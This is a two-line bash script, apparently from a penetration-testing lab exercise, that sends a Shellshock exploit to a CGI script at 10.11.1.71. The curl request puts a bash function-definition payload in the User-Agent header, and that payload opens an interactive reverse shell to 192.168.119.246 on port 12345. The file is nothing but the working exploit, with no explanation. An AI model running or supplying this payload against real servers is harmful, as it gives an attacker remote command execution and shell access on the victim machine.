#!/bin/bash

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.246/12345 0>&1' http://10.11.1.71/cgi-bin/admin.cgi
